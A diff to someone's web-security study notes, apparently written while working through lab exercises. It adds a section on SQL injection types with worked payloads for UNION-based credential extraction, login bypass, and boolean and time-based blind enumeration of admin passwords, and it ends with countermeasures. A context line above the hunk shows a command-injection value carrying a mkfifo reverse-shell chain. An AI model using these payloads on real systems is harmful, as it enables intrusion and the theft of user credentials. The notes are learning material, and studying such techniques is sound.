@@ -127,10 +127,130 @@ file=hello.txt; rm+-f+/tmp/f%3b+mkfifo+/tmp/f%3b+cat+/tmp/f+|+/bin/sh+-i+2>%261+
 #### SQL Injection:
 "User input it not validated correctly when application communicated with the database, allowing the attacker to get, remove or change data in the database"
 
+See: [[SQL]]
+
+Types of SQL injection:
+**In-Band:** Same method of communication being used to exploit and receive the result.
+- Error-based SQL injection: Get error messages from the database 
+- Union-based SQL injection: Use the UNION and SELECT keywords to return addition information from the query 
+
+Example UNION based: 
+```
+
+(This in on the server: select * from article where id =)
+
+The site lets us add an union-select to the query, and we use this to find the name of the database:  sqli_one
+
+0 union select 1,2,database();
+
+We want to find the password of the user martin, so we look for a table with userinfo:
+
+0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
 
 
+Most users of the databases has access to the information_schema, and its a 'scheme' most SQL database have and contains info about the database. We use this to list all the tables of the sqli_one database. 
+
+We find the decired table: staff_users. Now we want to list the columns of this table: 
+
+0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+
+We find the columns: username, password and id.
+
+We list the username and password of all the users:
+
+0 UNION SELECT 1,2,group_concat(username,':',password) FROM staff_users
+
+Bom! we got our password :)
+```
+
+**Blind:** We get not feedback from the screen if our attack was successful or not. 
+
+Example Blind Authentication bypass: 
+```
+We are given that the site uses this query to login the user:
+
+select * from users where username='' and password='' limit 1;
+
+Where we spesify the username and password on the page. We can simply add:
+'or 1=1;--
+
+so:
+
+select * from users where username='' and password='' or 1=1;-- limit 1;
+
+We escape the '' signs, and presents and or staement which is always true, then comment out the rest of the query. 
+
+```
 
 
+Example Blind boolean based:
+```
+The only output we get from the site is if the a user exists or not, we can use this parameter to verify if our injection worked or not. 
+
+First we find a username that is not taken, ex admin123, this returns false. 
+
+we send in: 
+admin123'or 1=1;--
+
+and oberse if this query results in true, it means our injection works. The site responds with true, so the site is vulnerable. 
+
+Now we would like to enumerate the site:
+admin123' UNION SELECT 1,2,3;--
+
+Keep on adding more "columns" to match the dimention of the first query. in this case its 3, so Select 1,2,3 returns true. 
+
+Then we would like to find the name of the database, we can do this by guessing with a wildcard character,%, if the site returns true for letter we try, we move on to the next character:
+
+admin123' UNION SELECT 1,2,3 where database() like 's%';--
+...
+admin123' UNION SELECT 1,2,3 where database() like 'sqli_three%';--
+
+So databasename is sqli_three.
+
+Do the same with the table names:
+`admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--`
+....
+`admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--`
+
+Then we need to find the column name of the table users in that database sqli_three:
+
+
+admin123' union select 1,2,3 from information_schema.columns where table_schema='sqli_three' and table_name='users' and column_name like 'password' and column_name != 'username' and column_name !='id';--
+
+We can now guess the password of the admin same way: 
+admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%'
+
+find out its 3845
+```
+
+Example Blind Time-based 
+
+```
+Same concept as boolean, but we look at response time as a conformation of correct or incorrect. 
+
+We enumerated the database:
+admin123' UNION SELECT SLEEP(5),2 where database() like 'sqli_four';--
+
+Gives a 5 sec delay response, so we have two columns and working in a database named 'sqli_four'.
+
+Found a table named users.
+
+in users find columns username and password. 
+
+Then we do 
+admin123' UNION SELECT 1,sleep(2) from users where username='admin' and password like 'a%'
+
+To guess the password for admin: 4961
+```
+
+
+**Out-of-Band:** Pretty rare and advanced, but the hacker passes in a payload which make a request back to machine he has control over. That way, he can confirm that the injection  was successful if he got the request.  
+
+
+**Counters to SQL injection:**
+- Parameterized queries 
+- Input validation 
+- Escaping user input: Basically just comment out special characters we thinks is malicious 
 
 
 
